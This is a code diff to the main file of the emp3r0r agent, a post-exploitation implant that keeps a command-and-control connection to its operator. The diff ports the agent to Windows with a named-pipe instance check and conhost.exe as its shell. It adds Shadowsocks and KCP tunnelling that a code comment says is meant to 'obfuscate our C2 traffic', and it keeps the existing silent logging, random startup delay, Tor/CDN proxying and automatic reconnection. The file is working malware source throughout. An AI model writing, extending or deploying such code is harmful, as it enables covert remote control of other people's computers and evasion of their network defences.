@@ -16,6 +16,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/Microsoft/go-winio"
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/lib/agent"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -52,38 +53,19 @@ func main() {
 	// don't be hasty
 	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
 
-	// mkdir -p UtilsPath
-	// use absolute path
-	// TODO find a better location for temp files
-	if !util.IsFileExist(agent.RuntimeConfig.UtilsPath) {
-		err = os.MkdirAll(agent.RuntimeConfig.UtilsPath, 0700)
-		if err != nil {
-			log.Fatalf("[-] Cannot mkdir %s: %v", agent.RuntimeConfig.AgentRoot, err)
-		}
-	}
-
 	// silent switch
 	log.SetOutput(ioutil.Discard)
 	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
 	if !*silent {
 		fmt.Println("emp3r0r agent has started")
 		log.SetOutput(os.Stderr)
-
-		// redirect everything to log file
-		f, err := os.OpenFile(fmt.Sprintf("%s/emp3r0r.log",
-			agent.RuntimeConfig.AgentRoot),
-			os.O_RDWR|os.O_CREATE|os.O_APPEND, 0600)
-		if err != nil {
-			log.Printf("error opening emp3r0r.log: %v", err)
-		} else {
-			log.SetOutput(f)
-		}
 	}
 
 	// PATH
-	os.Setenv("PATH", fmt.Sprintf("%s:/bin:/usr/bin:/usr/local/bin", agent.RuntimeConfig.UtilsPath))
+	os.Setenv("PATH", fmt.Sprintf(`%s;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\`, agent.RuntimeConfig.UtilsPath))
 
 	// HOME
+	os.Setenv("HOME", os.Getenv("USERPROFILE"))
 	u, err := user.Current()
 	if err != nil {
 		log.Printf("Get user info: %v", err)
@@ -91,7 +73,7 @@ func main() {
 		os.Setenv("HOME", u.HomeDir)
 	}
 
-	emp3r0r_data.DefaultShell = "cmd.exe"
+	emp3r0r_data.DefaultShell = "conhost.exe"
 
 	// daemonize
 	if *daemon {
@@ -114,33 +96,18 @@ func main() {
 
 	// if the agent's process name is not "emp3r0r"
 test_agent:
-	alive, pid := agent.IsAgentRunningPID()
+	alive := isAgentAlive()
 	if alive {
-		proc, err := os.FindProcess(pid)
-		if err != nil {
-			log.Println("WTF? The agent is not running, or is it?")
-		}
-
 		// exit, leave the existing agent instance running
 		if !*replace {
-			log.Printf("[%d->%d] Agent is already running and responsive, waiting...",
-				os.Getppid(),
-				os.Getpid())
+			log.Print("Agent is already running and responsive, waiting...")
 
 			util.TakeASnap()
 			goto test_agent
 		}
-
-		// if agent is not responsive, kill it, and start a new instance
-		// after IsAgentAlive(), the PID file gets replaced with current process's PID
-		// if we kill it, we will be killing ourselves
-		if proc.Pid != os.Getpid() {
-			err = proc.Kill()
-			if err != nil {
-				log.Println("Failed to kill old emp3r0r", err)
-			}
-		}
 	}
+
+	go socketListen()
 
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(emp3r0r_data.CCAddress) {
@@ -204,14 +171,6 @@ test_agent:
 		agent.RuntimeConfig.AgentProxy = cdnproxyAddr
 	}
 
-	// agent root
-	if !util.IsFileExist(agent.RuntimeConfig.AgentRoot) {
-		err = os.MkdirAll(agent.RuntimeConfig.AgentRoot, 0700)
-		if err != nil {
-			log.Printf("MkdirAll %s: %v", agent.RuntimeConfig.AgentRoot, err)
-		}
-	}
-
 	// socks5 proxy
 	go func() {
 		// start a socks5 proxy
@@ -236,6 +195,16 @@ test_agent:
 				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
 				ctx, cancel := context.WithCancel(context.Background())
 				go agent.StartBroadcast(true, ctx, cancel)
+
+				if agent.RuntimeConfig.UseShadowsocks {
+					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
+					agent.RuntimeConfig.AgentProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
+						agent.RuntimeConfig.ShadowsocksPort)
+
+					// run ss w/wo KCP
+					go agent.ShadowsocksC2Client()
+					go agent.KCPClient() // KCP client will run when UseKCP is set
+				}
 			}
 			return true
 
@@ -313,12 +282,61 @@ connect:
 		goto connect
 	}
 	log.Println("Connected to CC TunAPI")
-	if !util.IsFileExist(agent.RuntimeConfig.UtilsPath + "/bettercap") {
-		go agent.VaccineHandler()
-	}
 	err = agent.CCMsgTun(ctx, cancel)
 	if err != nil {
 		log.Printf("CCMsgTun: %v, reconnecting...", err)
 	}
 	goto connect
+}
+
+func socketListen() {
+	pipe_config := &winio.PipeConfig{
+		SecurityDescriptor: "",
+		MessageMode:        true,
+		InputBufferSize:    1024,
+		OutputBufferSize:   1024,
+	}
+	ln, err := winio.ListenPipe(
+		fmt.Sprintf(`\\.\pipe\%s`, agent.RuntimeConfig.SocketName),
+		pipe_config)
+	if err != nil {
+		log.Fatalf("Listen on %s: %v", agent.RuntimeConfig.SocketName, err)
+	}
+
+	serve_conn := func(c net.Conn) {
+		defer c.Close()
+		buf := make([]byte, 1024)
+		nr, err := c.Read(buf)
+		if err != nil {
+			log.Printf("Read: %v", err)
+			return
+		}
+		log.Printf("Server got: %s", buf[0:nr])
+
+		reply := fmt.Sprintf("emp3r0r running on PID %d", os.Getpid())
+		_, err = c.Write([]byte(reply))
+		if err != nil {
+			log.Printf("Write: %v", err)
+		}
+	}
+
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			log.Printf("Accept: %v", err)
+			continue
+		}
+		go serve_conn(conn)
+	}
+}
+
+func isAgentAlive() bool {
+	timeout := time.Second
+	c, err := winio.DialPipe(agent.RuntimeConfig.SocketName, &timeout)
+	if err != nil {
+		log.Printf("Seems dead: %v", err)
+		return false
+	}
+
+	return agent.IsAgentAlive(c)
 }
